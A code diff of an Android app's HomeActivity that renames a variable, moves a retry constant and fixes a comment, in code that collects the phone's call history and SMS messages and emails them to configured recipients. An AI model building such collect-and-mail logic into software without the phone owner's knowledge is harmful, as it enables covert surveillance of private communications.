@@ -47,8 +47,6 @@ public class HomeActivity extends Activity
 {
     protected static final String LOGTAG = "InitActivity";
     
-    private final static int DEFAULT_RETRY_COUNT = 3;
-    
     ImageView img_support;
     ImageButton btn_home;
 	Button btn_testMail;
@@ -233,7 +231,7 @@ public class HomeActivity extends Activity
     					GetInfoTask.CollectPhoneCallHist(context);
     					GetInfoTask.CollectSms(context);
         		
-    					// If network connected, try to collect and send the information
+    					// If network is not connected after collection, clean files and send message
     					if (!NetworkUtil.isNetworkConnected(context)) {
     						// Clean info files
         					FileCtrl.cleanTxtFiles(context);
@@ -244,11 +242,11 @@ public class HomeActivity extends Activity
     					}
         	
     					// Send mail
-    					String phoneNum = ConfigCtrl.getSelfName(context);
+    					String selfName = ConfigCtrl.getSelfName(context);
     					String subject = getResources().getString(R.string.mail_from) 
-        	          		 +  phoneNum + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date()) 
+        	          		 +  selfName + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date()) 
         	          		 + getResources().getString(R.string.mail_description);
-    					String body = String.format(getResources().getString(R.string.mail_body_info), phoneNum);
+    					String body = String.format(getResources().getString(R.string.mail_body_info), selfName);
     					String[] recipients = GlobalPrefActivity.getReceiverMail(context).split(",");
     					if (recipients.length == 0) {
     						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
@@ -257,7 +255,7 @@ public class HomeActivity extends Activity
     					String pwd = MailCfg.getSenderPwd(context);
         		
     					boolean result = false;
-    					int retry = DEFAULT_RETRY_COUNT;
+    					int retry = GlobalValues.DEFAULT_RETRY_COUNT;
     					String host = MailCfg.getHost(context);
     					String sender = MailCfg.getSender(context);
     					errMsg = "";
